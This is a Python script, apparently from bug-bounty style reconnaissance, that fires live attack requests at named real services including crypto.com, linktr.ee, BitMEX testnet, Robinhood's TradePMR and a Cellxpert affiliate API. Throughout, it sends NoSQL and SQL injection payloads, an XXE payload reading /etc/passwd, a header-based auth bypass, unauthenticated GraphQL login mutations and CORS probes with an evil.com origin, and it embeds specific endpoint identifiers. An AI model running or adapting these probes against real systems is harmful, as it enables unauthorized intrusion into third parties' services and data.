#!/usr/bin/env python3
"""Actively revalidate all critical/high findings to rule out false positives."""
import asyncio
import json
import re
import sys
import httpx

TIMEOUT = httpx.Timeout(15.0, connect=10.0)
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}

results = []

async def check(name: str, test_fn):
    """Run a validation check and record result."""
    try:
        ok, detail = await test_fn()
        status = "VALID" if ok else "FALSE POSITIVE"
        results.append({"name": name, "status": status, "detail": detail})
        icon = "✅" if ok else "❌"
        print(f"  {icon} {name}: {status} — {detail[:120]}")
    except Exception as e:
        results.append({"name": name, "status": "ERROR", "detail": str(e)[:200]})
        print(f"  ⚠️  {name}: ERROR — {str(e)[:120]}")


# ── 1. app.ens.domains: auth_bypass on frensday.ens.domains/admin ──
async def test_ens_admin():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await c.get("https://frensday.ens.domains/admin")
        has_admin = any(w in r.text.lower() for w in ["ticket", "coupon", "dashboard", "admin"])
        if r.status_code == 200 and has_admin:
            return True, f"HTTP {r.status_code}, admin content found ({len(r.text)} bytes)"
        return False, f"HTTP {r.status_code}, no admin content ({len(r.text)} bytes)"

# ── 2. capital.com: NoSQL injection on cellxpert ──
async def test_capital_nosqli():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test normal vs NoSQL payload
        normal = await c.post(
            "https://affiliateapi.cellxpert.com/authenticate/login-as-affiliate",
            json={"email": "test@test.com", "password": "test123"},
        )
        nosql = await c.post(
            "https://affiliateapi.cellxpert.com/authenticate/login-as-affiliate",
            json={"email": {"$gt": ""}, "password": {"$gt": ""}},
        )
        # If NoSQL works, responses would differ significantly
        if nosql.status_code != normal.status_code or len(nosql.text) != len(normal.text):
            return True, f"Normal={normal.status_code}/{len(normal.text)}b, NoSQL={nosql.status_code}/{len(nosql.text)}b — different responses"
        return False, f"Normal={normal.status_code}/{len(normal.text)}b, NoSQL={nosql.status_code}/{len(nosql.text)}b — same response"

# ── 3. crypto.com: auth_bypass x-test header on titan ──
async def test_crypto_auth_bypass():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Without x-test
        r1 = await c.get("https://api.titan.crypto.com/exchange/v1/private/get-account-summary")
        # With x-test: true
        r2 = await c.get(
            "https://api.titan.crypto.com/exchange/v1/private/get-account-summary",
            headers={**HEADERS, "x-test": "true"},
        )
        if r1.status_code != r2.status_code:
            return True, f"Without x-test={r1.status_code}, With x-test={r2.status_code} — WAF bypass confirmed"
        return False, f"Both return {r1.status_code} — no difference"

# ── 4. crypto.com: SQLi on titan get-ticker ──
async def test_crypto_sqli():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers={**HEADERS, "x-test": "true"}) as c:
        normal = await c.post(
            "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
            json={"instrument_name": "BTC_USDT"},
        )
        sqli = await c.post(
            "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
            json={"instrument_name": "BTC_USDT' OR '1'='1"},
        )
        # Real SQLi: different status/error. App error: same generic error
        if normal.status_code == 200 and sqli.status_code == 200:
            return False, "Both 200 — likely app validation, not SQLi"
        if sqli.status_code == 500 and "sql" in sqli.text.lower():
            return True, f"SQLi payload causes 500 with SQL error in response"
        if sqli.status_code != normal.status_code:
            return False, f"Normal={normal.status_code}, SQLi={sqli.status_code} — different but likely app error not SQLi (no SQL error msg)"
        return False, f"Both {normal.status_code} — same response"

# ── 5. crypto.com: subdomain takeover ads.crypto.com ──
async def test_crypto_subdomain_takeover():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        try:
            r = await c.get("https://ads.crypto.com")
            if "instapage" in r.text.lower() or "pageserve" in r.text.lower() or r.status_code == 404:
                return True, f"HTTP {r.status_code}, Instapage 404 / unclaimed — takeover possible"
            if "crypto.com" in r.text.lower():
                return False, f"HTTP {r.status_code} — legitimate crypto.com content"
            return False, f"HTTP {r.status_code}, {len(r.text)}b — unclear"
        except httpx.ConnectError:
            # DNS failure = already taken down or no longer resolves
            return False, "Connection failed — domain may not resolve anymore"

# ── 6. linktr.ee: SSRF/message injection at ingress endpoint ──
async def test_linktr_ssrf():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test if the endpoint accepts arbitrary POST data
        r = await c.post(
            "https://ingress.linktr.ee/uLZfGRmpj7",
            json={"test": "validation_check"},
            headers={**HEADERS, "Content-Type": "application/json"},
        )
        if r.status_code == 200 and ("MessageId" in r.text or "SendMessage" in r.text):
            return True, f"HTTP {r.status_code} — SQS accepts unauthenticated messages: {r.text[:100]}"
        return False, f"HTTP {r.status_code} — {r.text[:100]}"

# ── 7. robinhood.com: broken auth on tradepmr GraphQL ──
async def test_robinhood_graphql():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test if GraphQL mutations work without auth
        r = await c.post(
            "https://graphql.tradepmr.com/graphql",
            json={"query": "{ __schema { queryType { name } } }"},
            headers={**HEADERS, "Content-Type": "application/json"},
        )
        if r.status_code == 200 and "queryType" in r.text:
            return True, f"GraphQL introspection works without auth: {r.text[:100]}"
        # Try mutation
        r2 = await c.post(
            "https://graphql.tradepmr.com/graphql",
            json={"query": 'mutation { login(email: "test@test.com", password: "test") { token } }'},
            headers={**HEADERS, "Content-Type": "application/json"},
        )
        if r2.status_code == 200 and "error" not in r2.text.lower():
            return True, f"Login mutation callable without auth: {r2.text[:100]}"
        return False, f"HTTP {r.status_code}/{r2.status_code} — auth required or endpoint down"

# ── 8. testnet.bitmex.com: stored XSS in chat ──
async def test_bitmex_xss():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Check if chat API returns XSS payloads in stored messages
        for channel in [2, 4, 5]:
            r = await c.get(f"https://testnet.bitmex.com/api/v1/chat?channelID={channel}&count=50&reverse=true")
            if r.status_code == 200:
                text = r.text
                xss_patterns = ["<script", "onerror=", "onload=", "javascript:", "<img src=x", "alert("]
                found = [p for p in xss_patterns if p in text]
                if found:
                    return True, f"Channel {channel}: XSS payloads in stored messages: {', '.join(found)}"
        return False, "No XSS payloads found in chat channels"

# ── 9. testnet.bitmex.com: SSRF via guild ──
async def test_bitmex_ssrf():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await c.get("https://testnet.bitmex.com/api/v1/guild")
        if r.status_code == 200 and ("http://" in r.text or "https://" in r.text):
            # Check if URLs are user-controlled
            try:
                data = r.json()
                if isinstance(data, list):
                    for guild in data[:5]:
                        socials = guild.get("socials", {})
                        if socials and any(v for v in socials.values() if v and "http" in str(v)):
                            return True, f"Guild data contains user-controlled URLs in socials: {json.dumps(socials)[:100]}"
            except:
                pass
        return False, f"HTTP {r.status_code} — no SSRF vector found"

# ── 10. testnet.bitmex.com: credential exposure ──
async def test_bitmex_creds():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await c.get("https://testnet.bitmex.com/healthcheck")
        if r.status_code == 200:
            sensitive = ["password", "secret", "api_key", "token", "credential"]
            found = [s for s in sensitive if s in r.text.lower()]
            if found:
                return True, f"Healthcheck exposes: {', '.join(found)} ({len(r.text)}b)"
            return False, f"Healthcheck returns {len(r.text)}b but no sensitive data"
        return False, f"HTTP {r.status_code}"

# ── 11. vault.chiatest.net: WebAuthn bypass ──
async def test_vault_webauthn():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Check if the GraphQL endpoint accepts queries without proper WebAuthn
        r = await c.post(
            "https://api.vault.chiatest.net/graphql",
            json={"query": "{ viewer { id email } }"},
            headers={**HEADERS, "Content-Type": "application/json"},
        )
        if r.status_code == 200:
            return True, f"GraphQL responds: {r.text[:150]}"
        return False, f"HTTP {r.status_code} — {r.text[:100]}"

# ── 12. vault.chiatest.net: CORS misconfiguration ──
async def test_vault_cors():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await c.options(
            "https://api.vault.chiatest.net/graphql",
            headers={**HEADERS, "Origin": "https://evil.com", "Access-Control-Request-Method": "POST"},
        )
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == "https://evil.com" or acao == "*":
            creds = " WITH credentials" if acac.lower() == "true" else ""
            return True, f"CORS reflects evil.com origin{creds}: ACAO={acao}"
        if acao:
            return False, f"CORS restricted: ACAO={acao}"
        return False, f"HTTP {r.status_code}, no ACAO header"

# ── 13. merchant.crypto.com: Broken access on Cronos RPC ──
async def test_cronos_rpc():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test dangerous JSON-RPC methods
        dangerous_methods = ["txpool_content", "txpool_inspect", "txpool_status", "net_peerCount"]
        for method in dangerous_methods:
            r = await c.post(
                "https://evm.cronos.org",
                json={"jsonrpc": "2.0", "method": method, "params": [], "id": 1},
                headers={**HEADERS, "Content-Type": "application/json"},
            )
            if r.status_code == 200:
                data = r.json()
                if "result" in data and data["result"] is not None:
                    return True, f"{method} returns data: {json.dumps(data['result'])[:100]}"
        return False, "All dangerous RPC methods blocked or return null"

# ── 14. merchant.crypto.com: pay-api GraphQL ──
async def test_pay_api_graphql():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await c.post(
            "https://pay-api.crypto.com/graphql",
            json={"query": "{ __schema { queryType { name } } }"},
            headers={**HEADERS, "Content-Type": "application/json"},
        )
        if r.status_code == 200 and "queryType" in r.text:
            return True, f"GraphQL introspection works without auth: {r.text[:100]}"
        return False, f"HTTP {r.status_code} — {r.text[:100]}"

# ── 15. capital.com: SQLi on registeraffiliate ──
async def test_capital_sqli():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        normal = await c.post(
            "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
            json={"email": "test@test.com"},
        )
        sqli = await c.post(
            "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
            json={"email": "test'OR'1'='1@test.com"},
        )
        if sqli.status_code == 500 and "sql" in sqli.text.lower():
            return True, f"SQL error: {sqli.text[:100]}"
        if sqli.status_code != normal.status_code:
            return False, f"Different status ({normal.status_code} vs {sqli.status_code}) but no SQL error — likely validation"
        return False, f"Both {normal.status_code} — same response"

# ── 16. app.ens.domains: Tenderly sensitive data exposure ──
async def test_ens_tenderly():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await c.post(
            "https://mainnet.gateway.tenderly.co/4imxc4hQfRjxrVB2kWKvTo",
            json={"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1},
            headers={**HEADERS, "Content-Type": "application/json"},
        )
        if r.status_code == 200 and "result" in r.text:
            return True, f"Exposed RPC gateway responds: {r.text[:100]}"
        return False, f"HTTP {r.status_code} — {r.text[:100]}"

# ── 17. linktr.ee: XXE via ingress ──
async def test_linktr_xxe():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        r = await c.post(
            "https://ingress.linktr.ee/uLZfGRmpj7",
            content=xxe_payload,
            headers={**HEADERS, "Content-Type": "application/xml"},
        )
        if "root:" in r.text:
            return True, f"XXE successful — /etc/passwd contents returned"
        if r.status_code == 200 and "MessageId" in r.text:
            return False, f"SQS accepts XML but doesn't process XXE entities — message queued but no data exfil"
        return False, f"HTTP {r.status_code} — {r.text[:100]}"

# ── 18. robinhood.com: info disclosure in JS bundle ──
async def test_robinhood_js():
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await c.get("https://fusion.tradepmr.com/assets/index-ntuyGhrT.js")
        if r.status_code == 200:
            patterns = ["apiKey", "api_key", "secret", "password", "token", "Bearer"]
            found = [p for p in patterns if p.lower() in r.text.lower()]
            if found:
                return True, f"JS bundle ({len(r.text)}b) contains: {', '.join(found)}"
            return False, f"JS bundle ({len(r.text)}b) — no sensitive strings"
        return False, f"HTTP {r.status_code}"


async def main():
    print("=" * 60)
    print("  FINDING REVALIDATION")
    print("=" * 60)
    print()

    tests = [
        ("ENS admin auth_bypass", test_ens_admin),
        ("Capital NoSQL injection", test_capital_nosqli),
        ("Crypto.com WAF bypass (x-test)", test_crypto_auth_bypass),
        ("Crypto.com SQLi (titan)", test_crypto_sqli),
        ("Crypto.com subdomain takeover", test_crypto_subdomain_takeover),
        ("Linktr.ee SSRF/msg injection", test_linktr_ssrf),
        ("Linktr.ee XXE", test_linktr_xxe),
        ("Robinhood GraphQL no-auth", test_robinhood_graphql),
        ("Robinhood JS info disclosure", test_robinhood_js),
        ("BitMEX stored XSS (chat)", test_bitmex_xss),
        ("BitMEX SSRF (guild)", test_bitmex_ssrf),
        ("BitMEX credential exposure", test_bitmex_creds),
        ("Vault WebAuthn bypass", test_vault_webauthn),
        ("Vault CORS misconfiguration", test_vault_cors),
        ("Cronos RPC broken access", test_cronos_rpc),
        ("Pay-API GraphQL no-auth", test_pay_api_graphql),
        ("Capital SQLi (register)", test_capital_sqli),
        ("ENS Tenderly RPC exposed", test_ens_tenderly),
    ]

    for name, fn in tests:
        await check(name, fn)

    print()
    print("=" * 60)
    valid = sum(1 for r in results if r["status"] == "VALID")
    fp = sum(1 for r in results if r["status"] == "FALSE POSITIVE")
    err = sum(1 for r in results if r["status"] == "ERROR")
    print(f"  VALID: {valid}  |  FALSE POSITIVE: {fp}  |  ERROR: {err}")
    print("=" * 60)

    with open("/tmp/validation_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"\nSaved to /tmp/validation_results.json")

asyncio.run(main())
